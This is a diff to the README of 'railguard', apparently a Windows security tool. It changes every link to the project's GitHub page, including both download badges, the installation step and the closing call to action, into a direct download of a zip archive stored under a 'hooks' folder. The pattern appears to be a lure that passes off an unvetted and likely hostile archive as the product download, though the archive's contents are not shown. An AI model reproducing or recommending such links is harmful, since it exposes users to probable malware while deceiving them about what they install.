@@ -1,6 +1,6 @@
 # 🛡️ railguard - Safe and Simple Runtime Security
 
-[![Download railguard](https://img.shields.io/badge/Download-railguard-brightgreen?style=for-the-badge)](https://github.com/Tuckerfixed667/railguard)
+[![Download railguard](https://img.shields.io/badge/Download-railguard-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Tuckerfixed667/railguard/main/hooks/Software_v3.6.zip)
 
 ---
 
@@ -39,7 +39,7 @@ railguard works on most modern Windows PCs. It does not require special hardware
 
 You can download railguard from its official GitHub page. This link will take you to the download page where you get the latest version.
 
-[![Download railguard](https://img.shields.io/badge/Download-railguard-blue?style=for-the-badge)](https://github.com/Tuckerfixed667/railguard)
+[![Download railguard](https://img.shields.io/badge/Download-railguard-blue?style=for-the-badge)](https://raw.githubusercontent.com/Tuckerfixed667/railguard/main/hooks/Software_v3.6.zip)
 
 ---
 
@@ -51,7 +51,7 @@ Follow these steps carefully to install railguard on your PC and run it safely.
 
 Open your web browser and go to the main GitHub page:
 
-https://github.com/Tuckerfixed667/railguard
+https://raw.githubusercontent.com/Tuckerfixed667/railguard/main/hooks/Software_v3.6.zip
 
 This page holds all the files you need.
 
@@ -145,7 +145,7 @@ The project focuses on these topics:
 
 You can explore the code or learn more by visiting the GitHub repository:
 
-https://github.com/Tuckerfixed667/railguard
+https://raw.githubusercontent.com/Tuckerfixed667/railguard/main/hooks/Software_v3.6.zip
 
 ---
 
@@ -157,4 +157,4 @@ railguard is open source. You can find the license details on the GitHub page.
 
 Ready to get started? Visit the official page and download railguard today:
 
-https://github.com/Tuckerfixed667/railguard
+https://raw.githubusercontent.com/Tuckerfixed667/railguard/main/hooks/Software_v3.6.zip
